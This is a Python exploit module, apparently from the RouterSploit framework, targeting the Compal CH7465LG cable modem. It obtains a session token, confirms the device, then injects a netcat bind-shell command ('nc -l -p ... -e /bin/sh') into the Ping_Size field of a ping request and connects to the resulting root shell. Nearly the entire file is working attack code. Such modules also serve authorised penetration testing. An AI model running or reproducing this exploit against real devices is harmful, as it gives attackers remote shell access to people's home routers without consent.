import re
from time import sleep
from subprocess import call

from routersploit import (
    exploits,
    http_request,
    print_success,
    print_status,
    print_error,
    sanitize_url,
    validators,
    mute,
    boolify
)

class Exploit(exploits.Exploit):
    """
    Exploit implementation for Compal CH7465LG
    """

    __info__ = {
        'name': 'Compal CH7465LG remote shell exploit',
        'authors': [
            'Tomas Pruzina <pruzinat[at]gmail.com>',
        ],
        'references': [
            'https://www.exploit-db.com/exploits/40159/',
            'https://github.com/ties/compal_CH7465LG_py',
        ],
        'devices': [
            'Compal CH7465LG-LC (firmware version 4.50.18.13)',
        ]
    }

    target = exploits.Option('192.168.0.1', 'Target IP e.g. 192.168.0.1')
    port = exploits.Option(1337, 'Remote port for netcat shell [1337]')  
    verbosity = exploits.Option('no', 'Display data and status of each HTTP request response')
    netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
    
    token = None # csrf-token

    #@mute
    def check(self):
        # checkout default login page (to get initial session cookie)
        url = sanitize_url("{}:{}/common_page/login.html".format(self.target, 80))
        response = http_request(method="GET", url=url)
        self.print_response(response)

        # this piece should be unique enough to fail the check early (present on all firmware versions of UPC compal modem I have)
        if response is None or \
            "RX_CH_ST_DISABLE = 1,RX_CH_ST_IDLE,RX_CH_ST_NOT_LOCKED,RX_CH_ST_LOCKED,RX_CH_ST_QFM_LOST" not in response.text:
            return False

        # parse sessionToken (session cookie necessary for rest of commands to work)
        if self.update_token(response) is None:
            return False

        # query routers status - fun(1)
        response = self.fun_getter(1)
        if validate_response(response) is not True:
            return False
        
        # send ping request (without command injection)
        data = {'Type' : '0',
                'Target_IP' : '127.0.0.1',
                'Ping_Size' : '64',
                'Num_Ping' : '3',
                'Ping_Interval' : '1'
        }
        self.fun_setter(126, data)
        if validate_response(response) is not True:
            return False

        # query ping request status
        self.fun_getter(128)
        if validate_response(response) is not True:
            return False
        
        # everything went fine, return True
        return True


    def run(self):
        if self.check():
            print_success("Target is probably vulnerable")
        else:
            print_error("Target is not vulnerable")
            return False

        print_status("Sending malformed XML ping request")
        data = {'Type' : '0',
                'Target_IP' : 'google.com',
                'Ping_Size' : "64;nc -l -p {} -e /bin/sh;".format(self.port),
                'Num_Ping' : '3',
                'Ping_Interval' : '1'
        }
        self.fun_setter(126, data)
        
        # sleep a bit so that router can set up a remote shell
        sleep(1)

        # connect to remote shell via netcat
        print_status("entering remote shell [{} {} {}]".format(self.netcat_binary, self.target, self.port))
        retcode = call([self.netcat_binary, self.target, str(self.port)])
        print_status("Shell returned {}".format(retcode))

    def fun_getter(self, fun):
        # prepare XML getter HTML request
        url = sanitize_url('{}:{}/xml/getter.xml'.format(self.target, 80))
        data = {'token' : self.token,
                'fun' : fun
        }
        headers = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'referer': self.target
        }
        cookies = {'sessionToken' : self.token }

        # send
        response = http_request(method="POST", url=url, data=data, headers=headers, cookies=cookies)
        
        # update session token
        self.update_token(response)
        
        # debug print
        self.print_response(response)

        return response
    
    def fun_setter(self, fun, args):
        # prepare XML setter HTML request
        url = sanitize_url('{}:{}/xml/setter.xml'.format(self.target, 80))
        headers = { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'referer': self.target
        }
        data = {'token' : self.token,
                'fun' : fun
        }
        data = merge_dicts(data, args)
        cookies = { 'sessionToken' : self.token }

        response = http_request(method="POST", url=url, data=data, headers=headers, cookies=cookies)
        
        # update session token
        self.update_token(response)
        
        return response

    def update_token(self, response):
        ''' sessionToken (cookie) must be updated after each request '''
        cookie = response.headers['Set-Cookie']
        if cookie is None:
            return None

        match = re.findall('sessionToken=\w+', cookie)
        if len(match) is not 1:
            return None

        token = re.sub('sessionToken=', '', match[0])
        if len(token) <= 0:
            return None
        self.token = token
        return token

    def print_response(self, response):
        ''' debug print for http_request response'''
        if response is None:
            return
        
        if boolify(self.verbosity):
            if response.text and len(response.text):
                print_status(str(response.status_code) + "\n" + response.text)
            else:
                print_status(response.status_code)


def validate_response(response):
    ''' Router returns 200 status and XML on successful '''
    if response.status_code is not 200:
        return False

    # response data should contain XML header (fun_getter only)
    if len(response.text) and "<?xml" not in response.text:
        return False
        
    # otherwise assume ok
    return True

    
def merge_dicts(x, y):
        z = x.copy()
        z.update(y)
        return z


